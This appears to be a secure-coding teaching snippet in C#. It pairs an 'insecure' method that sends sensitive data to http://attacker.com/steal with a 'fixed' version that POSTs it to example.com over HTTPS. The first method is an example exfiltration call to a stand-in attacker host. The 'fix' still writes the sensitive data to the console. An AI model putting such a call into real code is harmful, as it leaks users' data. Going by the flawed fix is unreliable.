public void SendSensitiveDataToUntrustedUrl(string sensitiveData)
{
    // Insecure: Sends sensitive data to an untrusted URL
    var request = WebRequest.Create("http://attacker.com/steal?data=" + sensitiveData);
    using (var response = request.GetResponse())
    {
        Console.WriteLine("Data sent to attacker: " + sensitiveData);
    }
}

// Solve the above vulnerability
public void SendSensitiveDataToUntrustedUrl(string sensitiveData)
{
    // Secure: Sends sensitive data to a trusted URL using HTTPS
    var request = WebRequest.Create("https://example.com/collect");
    request.Method = "POST";
    request.ContentType = "application/x-www-form-urlencoded";
    using (var streamWriter = new StreamWriter(request.GetRequestStream()))
    {
        streamWriter.Write("data=" + WebUtility.UrlEncode(sensitiveData));
    }
    using (var response = request.GetResponse())
    {
        Console.WriteLine("Data sent securely to example.com: " + sensitiveData);
    }
}
